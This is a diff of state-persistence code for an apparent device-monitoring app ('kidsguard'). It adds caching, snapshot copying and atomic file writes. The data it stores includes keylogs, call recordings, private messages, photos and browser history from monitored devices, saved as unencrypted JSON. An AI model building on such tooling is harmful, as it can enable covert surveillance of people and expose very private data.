@@ -6,6 +6,10 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const stateDir = process.env.VERCEL ? "/tmp" : path.join(__dirname, "data");
 const stateFile = path.join(stateDir, "kidsguard-state.json");
 
+/** Warm lambda cache — survives between requests on the same instance. */
+const globalCache = globalThis.__kidsguardState ?? { snapshot: null };
+globalThis.__kidsguardState = globalCache;
+
 function mapToObject(map) {
   return Object.fromEntries(map);
 }
@@ -20,35 +24,32 @@ function objectToMap(obj) {
   return map;
 }
 
-/**
- * Snapshot in-memory stores for persistence on Vercel (serverless /tmp).
- */
 export function createStateSnapshot(stores) {
   return {
     deviceInvites: mapToObject(stores.deviceInvites),
-    boundDevices: stores.boundDevices,
+    boundDevices: [...stores.boundDevices],
     remoteControlByDevice: mapToObject(stores.remoteControlByDevice),
-    geofenceStateByDevice: stores.geofenceStateByDevice,
-    geofences: stores.geofences,
-    trackedKeywords: stores.trackedKeywords,
-    realLocations: stores.realLocations,
-    realCallLogs: stores.realCallLogs,
-    realMessages: stores.realMessages,
-    realSocialChats: stores.realSocialChats,
-    realContacts: stores.realContacts,
-    realUsageStats: stores.realUsageStats,
-    realInstalledApps: stores.realInstalledApps,
-    realNotifications: stores.realNotifications,
-    realBrowserHistory: stores.realBrowserHistory,
-    realWifiLogs: stores.realWifiLogs,
-    realSafetyAlerts: stores.realSafetyAlerts,
-    realPhotos: stores.realPhotos,
-    realKeylogs: stores.realKeylogs,
-    realAppCalls: stores.realAppCalls,
-    realCalendarEvents: stores.realCalendarEvents,
-    realGeofenceEvents: stores.realGeofenceEvents,
-    realKeywordAlerts: stores.realKeywordAlerts,
-    realCallRecordings: stores.realCallRecordings
+    geofenceStateByDevice: { ...stores.geofenceStateByDevice },
+    geofences: [...stores.geofences],
+    trackedKeywords: [...stores.trackedKeywords],
+    realLocations: [...stores.realLocations],
+    realCallLogs: [...stores.realCallLogs],
+    realMessages: [...stores.realMessages],
+    realSocialChats: [...stores.realSocialChats],
+    realContacts: [...stores.realContacts],
+    realUsageStats: [...stores.realUsageStats],
+    realInstalledApps: [...stores.realInstalledApps],
+    realNotifications: [...stores.realNotifications],
+    realBrowserHistory: [...stores.realBrowserHistory],
+    realWifiLogs: [...stores.realWifiLogs],
+    realSafetyAlerts: [...stores.realSafetyAlerts],
+    realPhotos: [...stores.realPhotos],
+    realKeylogs: [...stores.realKeylogs],
+    realAppCalls: [...stores.realAppCalls],
+    realCalendarEvents: [...stores.realCalendarEvents],
+    realGeofenceEvents: [...stores.realGeofenceEvents],
+    realKeywordAlerts: [...stores.realKeywordAlerts],
+    realCallRecordings: [...stores.realCallRecordings]
   };
 }
 
@@ -71,6 +72,9 @@ export function applyStateSnapshot(stores, snapshot) {
     stores.remoteControlByDevice.set(key, value);
   }
 
+  Object.keys(stores.geofenceStateByDevice).forEach((k) => {
+    delete stores.geofenceStateByDevice[k];
+  });
   Object.assign(stores.geofenceStateByDevice, snapshot.geofenceStateByDevice ?? {});
 
   if (Array.isArray(snapshot.geofences) && snapshot.geofences.length > 0) {
@@ -113,24 +117,33 @@ export function applyStateSnapshot(stores, snapshot) {
   }
 }
 
-export function loadPersistedState(stores) {
-  if (!process.env.VERCEL) return;
+function readSnapshotFromDisk() {
   try {
-    if (!fs.existsSync(stateFile)) return;
+    if (!fs.existsSync(stateFile)) return null;
     const raw = fs.readFileSync(stateFile, "utf8");
-    const snapshot = JSON.parse(raw);
+    return JSON.parse(raw);
+  } catch {
+    return null;
+  }
+}
+
+export function loadPersistedState(stores) {
+  const disk = readSnapshotFromDisk();
+  const snapshot = disk ?? globalCache.snapshot;
+  if (snapshot) {
     applyStateSnapshot(stores, snapshot);
-  } catch (err) {
-    console.warn("Failed to load persisted state:", err instanceof Error ? err.message : err);
+    globalCache.snapshot = createStateSnapshot(stores);
   }
 }
 
 export function savePersistedState(stores) {
-  if (!process.env.VERCEL) return;
   try {
-    fs.mkdirSync(stateDir, { recursive: true });
     const snapshot = createStateSnapshot(stores);
-    fs.writeFileSync(stateFile, JSON.stringify(snapshot));
+    globalCache.snapshot = snapshot;
+    fs.mkdirSync(stateDir, { recursive: true });
+    const tmp = `${stateFile}.${process.pid}.tmp`;
+    fs.writeFileSync(tmp, JSON.stringify(snapshot));
+    fs.renameSync(tmp, stateFile);
   } catch (err) {
     console.warn("Failed to save persisted state:", err instanceof Error ? err.message : err);
   }
